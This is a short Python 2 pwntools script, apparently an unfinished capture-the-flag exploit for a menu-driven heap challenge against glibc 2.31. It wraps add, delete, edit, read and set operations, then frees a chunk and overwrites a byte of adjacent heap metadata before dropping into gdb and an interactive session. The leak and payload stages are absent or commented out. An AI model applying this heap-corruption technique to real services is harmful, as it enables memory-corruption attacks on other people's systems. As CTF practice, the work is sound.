#!/usr/bin/python2

from pwn import *

exe = ELF("main_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
sla = lambda r,a,b : r.sendlineafter(a,"{}".format(b))
op = lambda r,idx : r.sendlineafter("Set Value\n", "{}".format(idx))
ru = lambda r,a    : r.recvuntil(a)
ra = lambda r,a    : r.recv(a)
sl = lambda r,a    : r.sendline("{}".format(a))
rl = lambda r      : r.recvline()

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def add(r, size):
    op(r, 1)
    sla(r, ":", size)

def delete(r, idx):
    op(r, 2)
    sla(r, ":", idx)

def edit(r, idx, payload):
    op(r, 3)
    sla(r,":", idx)
    sl(r, payload)

def read(r, idx):
    op(r, 4)
    sla(r, ":", idx)
    return ru(r, "1.")

def set(r, idx, off, val):
    op(r, 5)
    sla(r, ":", idx)
    sla(r, ":", off)
    sla(r, ":", val)

def main():
    r = conn()

    add(r, 1234)
    add(r, 1234)
    edit(r, 1, "B"*20)
    delete(r, 1)
    set(r, 0, 1272, "\x01")
    #edit(r, 0, "A"*1234)
    #chef = read(r, 1)
    #log.info(chef)
    add(r, 1234)
    gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
